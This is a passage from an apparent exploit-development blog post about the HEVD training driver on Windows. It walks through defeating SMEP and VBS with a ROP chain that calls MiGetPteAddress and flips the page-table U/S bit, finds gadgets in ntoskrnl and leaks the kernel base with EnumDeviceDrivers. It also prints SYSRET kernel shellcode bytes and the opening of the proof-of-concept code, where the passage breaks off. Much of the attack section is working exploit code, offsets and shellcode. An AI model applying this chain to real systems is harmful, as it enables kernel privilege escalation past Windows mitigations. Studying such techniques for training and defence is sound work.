</span></span><span style="display:flex;"><span>  num <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoll</span>(argv[<span style="color:#ae81ff">1</span>], NULL, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;OLD CR4:</span><span style="color:#ae81ff">\n\n\t</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(PRINTF_BINARY_PATTERN_INT64, <span style="color:#a6e22e">PRINTF_BYTE_TO_BINARY_INT64</span>(num));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">putchar</span>(<span style="color:#e6db74">&#39;\n&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  num <span style="color:#f92672">=</span> <span style="color:#a6e22e">flip_bit</span>(num, <span style="color:#ae81ff">20</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;NEW CR4</span><span style="color:#ae81ff">\n\n\t</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(PRINTF_BINARY_PATTERN_INT64, <span style="color:#a6e22e">PRINTF_BYTE_TO_BINARY_INT64</span>(num));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">putchar</span>(<span style="color:#e6db74">&#39;\n&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Result: 0x%lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, num);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Let&rsquo;s run it.</p>
<pre tabindex="0"><code>$ ./get_cr4 0x0000000000b50ef8
OLD CR4:

        00000000 00000000 00000000 00000000 00000000 10110101 00001110 11111000 
NEW CR4

        00000000 00000000 00000000 00000000 00000000 10111101 00001110 11111000 

Result: 0xbd0ef8
</code></pre><p>So basically we have to place this value into CR4 to turn off SMEP&hellip; While researching this I came across a blog post by <a href="https://fluidattacks.com/blog/hevd-smep-bypass/">fluidattacks</a> and noticed he used a ROP gadget in the <code>nt</code> module, specifically <code>KeFlushCurrentTb</code>. We can get our current running version using WinDbg via <code>vertarget</code>. When ran on our target, this was the currently installed Windows version:</p>
<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/vertarget.png" alt="alt text"></p>
<p>That said, this gadget would not be available to us. If we check for other similar functions we find a similar gadget within <code>nt!KeFlushCurrentTbImmediatley</code> with the main difference being <code>RCX</code> being used to modify CR4 instead of <code>EAX</code>:</p>
<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/KeFlush.png" alt="alt text"></p>
<p>Since addresses are randomized, we need to calculate the offset of that ROP gadget from the start of the <code>nt</code> module:</p>
<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/rva.png" alt="alt text"></p>
<p>Here we see the offset is <code>0x000000000039dc27</code>.</p>
<h3 id="finding--using-rop-gadgets">Finding &amp; Using ROP Gadgets</h3>
<p>Now we need to find a <code>pop rcx; ret</code> gadget to place the new <code>CR4</code> value into <code>RCX</code>. We can find one using <a href="https://github.com/0vercl0k/rp">rp++</a>, which has quickly become my favorite ROP gadget tool. Here we search for gadgets within <code>ntoskrnl.exe</code> since this is the primary kernel file for the Windows OS. To do this you can use the following syntax:</p>
<pre tabindex="0"><code>rp-win.exe --rop=50 --va=0 --file C:\Windows\System32\ntoskrnl.exe &gt; rop.txt
</code></pre><p>We can then parse the results using powershell.</p>
<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/pwoershell.png" alt="alt text"></p>
<p>Using these offsets we can confirm we have a working gadget in WinDbg.</p>
<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/confirm.png" alt="alt text"></p>
<p>However, we still have to deal with the randomization of the <code>nt</code> module itself&hellip;</p>
<h3 id="finding-the-kernel-base-address">Finding the Kernel Base Address</h3>
<p>If you peeked into my brain during this period of learning, you would have observed unadulterated fear. Since under a user-mode exploit you would normally now require a read primitive to get the base address of a loaded module. However, with a little bit of research you&rsquo;ll find there are multiple methods to obtain the base address of <code>nt</code> (or any other loaded module for that matter) from medium integrity (default user configuration).</p>
<p>I ended up using a known method of leveraging <code>EnumDeviceDrivers</code> to obtain the base address.</p>
<p>The code I used can be seen below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">GetKernelBaseAddress</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    ULONG_PTR pKernelBaseAddress <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    LPVOID <span style="color:#f92672">*</span>lpImageBase <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    DWORD dwBytesNeeded <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">EnumDeviceDrivers</span>(NULL, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>dwBytesNeeded)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to calculate bytes needed for device driver entries&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(lpImageBase <span style="color:#f92672">=</span> (LPVOID <span style="color:#f92672">*</span>)<span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, dwBytesNeeded))) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate heap for lpImageBase</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (lpImageBase) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpImageBase);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">EnumDeviceDrivers</span>(lpImageBase, dwBytesNeeded, <span style="color:#f92672">&amp;</span>dwBytesNeeded)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] EnumDeviceDrivers: %d&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (lpImageBase) {
</span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpImageBase);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pKernelBaseAddress <span style="color:#f92672">=</span> ((ULONG_PTR <span style="color:#f92672">*</span>)lpImageBase)[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpImageBase);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Kernel Base Address: %llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pKernelBaseAddress);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> pKernelBaseAddress;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>With that we should have everything needed to get code execution! Right? Wrong :(</p>
<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/error.png" alt="alt text"></p>
<p>When putting everything together, we get the error above (ignore the different gadget location I tried changing it at this point because I could not fathom this not working).</p>
<p>What happened? Well&hellip; it looks like we encountered a new memory protection that I have not heard of. We&rsquo;ve run into <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Weston-Windows-10-Mitigation-Improvements.pdf">Virtualization-Based Security (VBS)</a>, which means any <a href="https://www.microsoft.com/en-us/security/blog/2017/03/27/detecting-and-mitigating-elevation-of-privilege-exploit-for-cve-2017-0005/#:~:text=Unauthorized%20modifications,instantly.">&ldquo;unauthorized modifications of the CR4 control register bitfields, including the SMEP field, are blocked instantly&rdquo;</a>.</p>
<h2 id="bypassing-vbs-theory">Bypassing VBS (Theory)</h2>
<p>Having conducted a bit of research into how others have approached this, the idea here is to flip a bit within a Page Table Entry (PTE) respective to the memory location of our usermode shellcode.</p>
<p>If we recall when we tried to execute the shellcode directly we got the following error:</p>
<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/error_pte.png" alt="alt text"></p>
<p>Basically, the way SMEP is enforced is on a per memory basis, via the U/S PTE control bit. Let&rsquo;s look at the output of <code>!pte</code> in WinDbg in regards to the user mode shellcode allocation to try to understand the page table entry permissions.</p>
<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/pte_output.png" alt="alt text"></p>
<p>So what would happen if we were to clear the user mode bit (U)? If flipped, this page in thoery becomes a Kernel mode page. The bit location of U can be seen below.</p>
<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/pte_bits.png" alt="alt text"></p>
<p>Let&rsquo;s set a breakpoint at <code>HEVD+0x866b9</code> and reboot to test this. Once our breakpoint is hit, we can modify the PTE as shown below. Once execution is continued you can see we successfully get code execution as we overwrite RAX with 0xDEADBEEF (psuedo shellcode).</p>
<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/flip_bit.png" alt="alt text"></p>
<p>Sweet, we have a solid bypass route for SMEP and VBS but how can we do this dynamically&hellip;</p>
<h1 id="violet-phosphorus">Violet Phosphorus</h1>
<p>With our analysis complete I decided to put my theory into practice and created <code>Violet Phosphorus</code> a universal and generic SMEP/VBS bypass. Can we call this the successor of the <a href="https://www.corelan.be/index.php/2011/07/03/universal-depaslr-bypass-with-msvcr71-dll-and-mona-py/">White Phosphorus Exploit Pack</a>? Or would that be too much&hellip; you can find the ROP chain below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#75715e">/* Prepare RDX register for later. This is needed for the XOR operation */</span>
</span></span><span style="display:flex;"><span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3f99ce</span>; <span style="color:#75715e">// pop rdx ; pop rax ; pop rcx ; ret [nt]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000008</span>; <span style="color:#75715e">// Set RDX to 0x08, we will need this to accomplish the XOR
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Setup the call to MiGetPteAddress in order to get the address of the PTE for our
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     userland code. The setup is as follows:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       RAX -&gt; VOID *MiGetPteAddress(
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">         ( RCX == PTE / Userland Code )
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       );
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Once the call is complete RAX should contain the pointer to our PTE. */</span>
</span></span><span style="display:flex;"><span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xa74d93</span>; <span style="color:#75715e">// pop rcx ; ret     [nt]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int64_t</span>)shellcode;     <span style="color:#75715e">// *shellcode        [nt]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x26b560</span>; <span style="color:#75715e">// MiGetPteAddress() [nt]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Now that we have obtained the PTE address, we can modify the 2nd bit in order to
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     mark the page as a kernel page (U -&gt; K). We can do this using XOR ;) */</span>
</span></span><span style="display:flex;"><span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2ffbfb</span>; <span style="color:#75715e">// sub rax, rdx ; ret                [nt]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xa6f2f5</span>; <span style="color:#75715e">// push rax ; pop rbx ; ret          [nt]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3f99ce</span>; <span style="color:#75715e">// pop rdx ; pop rax ; pop rcx ; ret [nt]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000004</span>; <span style="color:#75715e">// When we XOR the PTE by 0x4 we flip the 2nd bit (U -&gt; K)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span>               <span style="color:#ae81ff">0x000000</span>; <span style="color:#75715e">// [filler]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  buffer[i<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2107b2</span>; <span style="color:#75715e">// xor  [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret [nt]
</span></span></span></code></pre></div><h2 id="understanding-the-rop-chain">Understanding the ROP Chain</h2>
<p>Let&rsquo;s be honest there exists other ways to bypass VBS/SMEP but from what I&rsquo;ve seen most require a leak. Why suffer when Microsoft gives us a function to get this information dynamically? Below is the ASM code within WinDbg of the <em>MiGetPteAddress()</em> function.</p>
<pre tabindex="0"><code>0: kd&gt; u nt!MiGetPteAddress
nt!MiGetPteAddress:
fffff800`4d67f770 48c1e909                shr     rcx,9
fffff800`4d67f774 48b8f8ffffff7f000000    mov rax,7FFFFFFFF8h
fffff800`4d67f77e 4823c8                  and     rcx,rax
fffff800`4d67f781 48b80000000080f0ffff    mov rax,0FFFFF08000000000h
fffff800`4d67f78b 4803c1                  add     rax,rcx
fffff800`4d67f78e c3                      ret
</code></pre><p>From what I&rsquo;ve seen in the &ldquo;wild&rdquo;, people normally use this function to get the base address of all PTE&rsquo;s. Let&rsquo;s take a step back and ask ourselves what does this function actually do when called? We don&rsquo;t even need Ghidra for this to be honest. Let&rsquo;s write the C equivalent to this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* wetw0rk */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int64_t</span> <span style="color:#a6e22e">MiGetPteAddress</span>(<span style="color:#66d9ef">int64_t</span> rcx)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int64_t</span> rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    rcx <span style="color:#f92672">=</span> rcx <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">9</span>;
</span></span><span style="display:flex;"><span>    rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x7FFFFFFFF8</span>;
</span></span><span style="display:flex;"><span>    rcx <span style="color:#f92672">=</span> rcx <span style="color:#f92672">&amp;</span> rax;
</span></span><span style="display:flex;"><span>    rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0FFFFF08000000000</span>;
</span></span><span style="display:flex;"><span>    rax <span style="color:#f92672">=</span> rax <span style="color:#f92672">+</span> rcx;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> rax;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;PTE Located @{ 0x%llx }</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">MiGetPteAddress</span>(<span style="color:#ae81ff">0x00000220c16d0000</span>));
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If we compile this we see it gives us the the address of the PTE.</p>
<pre tabindex="0"><code>┌──(wetw0rk㉿kali)-[~]
└─$ gcc MiGetPteAddress.c -o meme
                                                                                                                                                                                                                                             
┌──(wetw0rk㉿kali)-[~]
└─$ ./meme 
PTE Located @{ 0xfffff0811060b680 }
</code></pre><p>This means we can leverage this existing function to manipulate the PTE directly. After all, we are running under the context of the Kernel so we can call Bill Gates if we want to. To summarize all we need to do is pass this function the address of our shellcode and in return this function will return the PTE respective to our allocation. How nice :)</p>
<p>Once we have the address of the PTE, we simply dereference it and flip the <code>U</code> bit to a <code>K</code> bit. What insane mathematical operation must we do to accomplish such a task?</p>
<p>That&rsquo;s right - XOR!</p>
<pre tabindex="0"><code>&gt;&gt;&gt; &#34;0x&#34; + hex(0x0000000226D83867 ^ 4)[2:].zfill(16)
&#39;0x0000000226d83863&#39;
</code></pre><p>You know what this means right?</p>
<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/captain.gif" alt="alt text"></p>
<h1 id="crafting-a-poc">Crafting a PoC</h1>
<p>At this point we have everything we need to get code execution&hellip; except returning to Userland. Normally it&rsquo;s best to restore execution flow manually. However, I decided to instead use <a href="https://kristal-g.github.io/2021/05/08/SYSRET_Shellcode.html">Kristal-G&rsquo;s SYSRET</a> shellcode - a technique that allows for a generic return from the Kernel. From my understanding this is the first of its kind (other than the <a href="https://github.com/vnik5287/sock_diag_x64/blob/486ce10dbef95776b22f228a74afe39ec9a0e16c/sockdiag_smep.c#L59">Linux variant</a>). You can generate Kristal-G&rsquo;s shellcode using <a href="https://github.com/wetw0rk/Sickle">Sickle</a> as shown below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wetw0rk㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/opt/Sickle/src<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ python3 sickle.py -p windows/x64/kernel_sysret -f c -m pinpoint
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00&#34;</span> // movabs rax, qword ptr gs:<span style="color:#f92672">[</span>0x188<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x66\x8b\x88\xe4\x01\x00\x00&#34;</span>                 // mov cx, word ptr <span style="color:#f92672">[</span>rax + 0x1e4<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x66\xff\xc1&#34;</span>                                 // inc cx
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x66\x89\x88\xe4\x01\x00\x00&#34;</span>                 // mov word ptr <span style="color:#f92672">[</span>rax + 0x1e4<span style="color:#f92672">]</span>, cx
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x48\x8b\x90\x90\x00\x00\x00&#34;</span>                 // mov rdx, qword ptr <span style="color:#f92672">[</span>rax + 0x90<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x48\x8b\x8a\x68\x01\x00\x00&#34;</span>                 // mov rcx, qword ptr <span style="color:#f92672">[</span>rdx + 0x168<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x4c\x8b\x9a\x78\x01\x00\x00&#34;</span>                 // mov r11, qword ptr <span style="color:#f92672">[</span>rdx + 0x178<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x48\x8b\xa2\x80\x01\x00\x00&#34;</span>                 // mov rsp, qword ptr <span style="color:#f92672">[</span>rdx + 0x180<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x48\x8b\xaa\x58\x01\x00\x00&#34;</span>                 // mov rbp, qword ptr <span style="color:#f92672">[</span>rdx + 0x158<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x31\xc0&#34;</span>                                     // xor eax, eax
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x0f\x01\xf8&#34;</span>                                 // swapgs 
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x48\x0f\x07&#34;</span>                                 // sysretq
</span></span></code></pre></div><p>Below is the PoC code, however offsets may be different on your build of Windows.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;psapi.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// I/O Request Packets (IRPs)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define TRIGGER_BUFFER_OVERFLOW_STACK 0x222003
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUFFER_SIZE 4242
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint64_t</span> <span style="color:#a6e22e">GetKernelBaseAddress</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    ULONG_PTR pKernelBaseAddress <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    LPVOID <span style="color:#f92672">*</span>lpImageBase <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    DWORD dwBytesNeeded <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">EnumDeviceDrivers</span>(NULL, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>dwBytesNeeded)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to calculate bytes needed for device driver entries&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(lpImageBase <span style="color:#f92672">=</span> (LPVOID <span style="color:#f92672">*</span>)<span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, dwBytesNeeded))) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate heap for lpImageBase</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (lpImageBase) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpImageBase);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">EnumDeviceDrivers</span>(lpImageBase, dwBytesNeeded, <span style="color:#f92672">&amp;</span>dwBytesNeeded)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] EnumDeviceDrivers: %d&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (lpImageBase) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpImageBase);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pKernelBaseAddress <span style="color:#f92672">=</span> ((ULONG_PTR <span style="color:#f92672">*</span>)lpImageBase)[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpImageBase);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Kernel Base Address: %llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pKernelBaseAddress);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> pKernelBaseAddress;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
